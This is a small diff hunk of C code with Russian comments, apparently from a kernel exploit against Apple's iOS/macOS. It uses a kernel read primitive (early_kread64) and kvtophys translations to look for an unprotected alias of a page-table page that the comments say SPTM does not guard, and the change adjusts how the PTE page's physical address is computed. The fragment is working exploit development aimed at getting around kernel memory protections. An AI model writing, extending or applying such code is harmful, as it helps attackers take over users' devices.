@@ -7083,7 +7083,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             // IODARTFamily пишет PTE ежедневно — через ДРУГОЙ алиас той же страницы
             // (zone-map/служебная карта), который SPTM не охраняет. Ищем указатель P
             // среди объектов цепочки с kvtophys(P) на той же странице, что ptePA.
-            uint64_t ptePagePA = ptePA190 & ~0x3fffULL;
+            uint64_t ptePA195 = kvtophys(pteVA);
+            uint64_t ptePagePA = ptePA195 & ~0x3fffULL;
             uint64_t aliasVA = 0;
             uint64_t pools[8] = { mapVA, dartVA, pipeVA, provVA,
                                   kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xc10)) : 0, 0, 0, 0 };
